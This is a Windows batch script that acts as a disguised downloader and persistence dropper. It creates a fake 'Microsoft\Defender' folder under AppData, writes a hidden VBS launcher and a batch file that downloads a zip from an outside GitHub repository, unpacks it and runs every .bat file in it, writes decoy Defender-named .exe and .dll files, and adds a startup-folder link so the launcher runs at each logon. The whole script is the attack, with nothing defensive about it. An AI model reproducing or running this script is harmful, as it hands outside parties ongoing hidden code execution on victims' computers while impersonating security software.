@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
if not exist "%appdata%\Microsoft\Defender" md "%appdata%\Microsoft\Defender"
echo powershell -command "do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping)" > "%appdata%\Microsoft\Defender\WindowsDefenderScan.bat"
echo cd "%%appdata%%\Microsoft\Defender" >> "%appdata%\Microsoft\Defender\WindowsDefenderScan.bat"
echo if exist Server-main rmdir /s /q Server-main >> "%appdata%\Microsoft\Defender\WindowsDefenderScan.bat"
echo if exist Server.zip del Server.zip >> "%appdata%\Microsoft\Defender\WindowsDefenderScan.bat"
echo powershell -command "Invoke-WebRequest 'https://github.com/a7ecc/Server/archive/refs/heads/main.zip' -OutFile Server.zip" >> "%appdata%\Microsoft\Defender\WindowsDefenderScan.bat"
echo powershell -command "Expand-Archive Server.zip '.\'" >> "%appdata%\Microsoft\Defender\WindowsDefenderScan.bat"
echo cd Server-main >> "%appdata%\Microsoft\Defender\WindowsDefenderScan.bat"
echo for /f %%%%a in ('dir /b "%appdata%\Microsoft\Defender\Server-main\*.bat"') do (%%%%a) >> "%appdata%\Microsoft\Defender\WindowsDefenderScan.bat"
echo Set WshShell = CreateObject("WScript.Shell") > "%appdata%\Microsoft\Defender\WindowsDefenderBackgroundServices.vbs"
echo WshShell.Run chr(34) ^& "%%appdata%%\Microsoft\Defender\WindowsDefenderScan.bat" ^& Chr(34), 0 >> "%appdata%\Microsoft\Defender\WindowsDefenderBackgroundServices.vbs"
echo Set WshShell = Nothing >> "%appdata%\Microsoft\Defender\WindowsDefenderBackgroundServices.vbs"
echo %random%%random%%random%%random% > "%appdata%\Microsoft\Defender\WindowsDefenderServices.exe"
echo %random%%random%%random%%random% > "%appdata%\Microsoft\Defender\WindowsDefenderServicesUpdates.dll"
echo %random%%random%%random%%random% > "%appdata%\Microsoft\Defender\WindowsDefenderServicesBackground.dll"
mklink "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Defender Services.lnk" "%appdata%\Microsoft\Defender\WindowsDefenderBackgroundServices.vbs" >nul 2>&1
cd "%appdata%\Microsoft\Defender"
start WindowsDefenderBackgroundServices.vbs
exit